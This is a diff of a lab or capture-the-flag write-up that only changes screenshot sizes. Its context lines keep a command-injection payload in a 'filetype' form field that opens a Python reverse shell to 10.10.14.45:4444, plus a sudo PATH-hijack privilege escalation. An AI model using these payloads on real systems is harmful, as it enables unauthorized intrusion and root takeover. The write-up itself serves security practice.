@@ -90,7 +90,7 @@ Remember before run the exploit. We must run the listener using NETCAT.
 ```
 photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;export RHOST="10.10.14.45";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'&dimensions=3000x2000
 ```
-<img src="https://user-images.githubusercontent.com/67650329/207798043-4202ea42-e49f-40f2-9b04-ca7bb0cb46a2.png" width="500px" align="center">
+<img src="https://user-images.githubusercontent.com/67650329/207798043-4202ea42-e49f-40f2-9b04-ca7bb0cb46a2.png" width="300px" align="center">
 
 <img src="https://user-images.githubusercontent.com/67650329/207798091-18f4a589-3de5-417c-a7f6-82d77c6716ec.png" width="500px" align="center">
 
@@ -102,7 +102,7 @@ chmod +x find
 sudo PATH=/tmp:$PATH /opt/cleanup.sh
 ```
 
-<img src="https://user-images.githubusercontent.com/67650329/207798205-9a5040a0-1df6-4043-9056-ae485f220f45.png" width="500px" align="center">
+<img src="https://user-images.githubusercontent.com/67650329/207798205-9a5040a0-1df6-4043-9056-ae485f220f45.png" width="300px" align="center">
 
 Thank you for reading 👋.
 
